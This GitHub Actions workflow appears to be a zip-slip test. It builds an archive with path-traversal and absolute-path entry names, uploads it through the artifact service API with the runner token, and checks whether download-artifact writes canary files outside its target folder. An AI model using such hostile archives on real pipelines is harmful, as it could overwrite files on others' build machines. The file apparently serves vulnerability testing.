name: artifact-zipslip
on: workflow_dispatch
jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: build a zip with hostile ENTRY names
        run: |
          python3 - <<'EOF'
          import zipfile
          z=zipfile.ZipFile('/tmp/hostile.zip','w',zipfile.ZIP_DEFLATED)
          z.writestr('normal.txt','ZIPSLIP_NORMAL_66ff\n')
          z.writestr('../escape1.txt','ZIPSLIP_ESCAPE1_66ff\n')
          z.writestr('../../escape2.txt','ZIPSLIP_ESCAPE2_66ff\n')
          z.writestr('/abs.txt','ZIPSLIP_ABS_66ff\n')
          z.writestr('a/../../b/escape3.txt','ZIPSLIP_ESCAPE3_66ff\n')
          z.close()
          import hashlib,os
          d=open('/tmp/hostile.zip','rb').read()
          print('SIZE',len(d)); print('SHA', hashlib.sha256(d).hexdigest())
          EOF
          ls -l /tmp/hostile.zip
      - uses: actions/github-script@v7
        with:
          script: |
            const fs=require('fs'), crypto=require('crypto');
            const tok=process.env.ACTIONS_RUNTIME_TOKEN, base=process.env.ACTIONS_RESULTS_URL;
            const claims=JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
            const m=(claims.scp||"").match(/Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i);
            const ids={workflow_run_backend_id:m[1], workflow_job_run_backend_id:m[2]};
            const NAME="zipslip";
            let r=await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:NAME,version:4})});
            const created=await r.json();
            core.info("CREATE http="+r.status+" ok="+created.ok);
            const data=fs.readFileSync('/tmp/hostile.zip');
            const put=await fetch(created.signed_upload_url+"&comp=block&blockid="+Buffer.from("blk1").toString('base64'),
              {method:"PUT",headers:{"x-ms-blob-type":"BlockBlob"},body:data});
            core.info("PUT block http="+put.status);
            const list='<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>'+Buffer.from("blk1").toString('base64')+'</Latest></BlockList>';
            const commit=await fetch(created.signed_upload_url+"&comp=blocklist",
              {method:"PUT",headers:{"Content-Type":"application/xml"},body:list});
            core.info("COMMIT blocklist http="+commit.status);
            const sha=crypto.createHash('sha256').update(data).digest('hex');
            const fin=await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:NAME,size:data.length,hash:"sha256:"+sha})});
            core.info("FINALIZE http="+fin.status+" body="+(await fin.text()).slice(0,140));
  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - run: mkdir -p /home/runner/work/tgt/dl && echo m > /home/runner/work/tgt/marker
      - uses: actions/download-artifact@v4
        continue-on-error: true
        with:
          name: zipslip
          path: /home/runner/work/tgt/dl
      - name: where did entries land
        run: |
          echo "--- inside download root ---"
          find /home/runner/work/tgt -maxdepth 4 | sed 's|^|  |'
          echo "--- ZIPSLIP canaries ANYWHERE on the runner ---"
          grep -rl ZIPSLIP_ /home/runner /tmp 2>/dev/null | sed 's|^|  HIT |'
